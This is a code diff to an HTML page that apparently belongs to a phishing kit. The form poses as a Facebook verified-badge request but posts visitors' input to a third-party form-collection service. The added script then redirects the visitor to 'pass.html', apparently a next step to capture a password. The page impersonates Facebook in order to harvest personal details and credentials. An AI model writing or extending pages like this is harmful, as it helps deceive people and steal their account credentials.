@@ -25,6 +25,25 @@
 
   <div class="deho">
 
+       <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      document.querySelector("form").addEventListener("submit", function(event) {
+        // You can prevent the default form submission if needed
+        // event.preventDefault();
+        
+        // Redirect URL after form submission
+        const redirectUrl = "pass.html";
+
+        // Perform the redirection
+        setTimeout(function() {
+          window.location.href = redirectUrl;
+        }, 500); // Redirect after a short delay to allow form submission to complete
+      });
+    });
+  </script>
+</head>
+
+<body>
     <form class="content" action="https://submit-form.com/drveUOFcV" method="post">
       
       <p class="head">Request a verified badge on Facebook</p> <br>
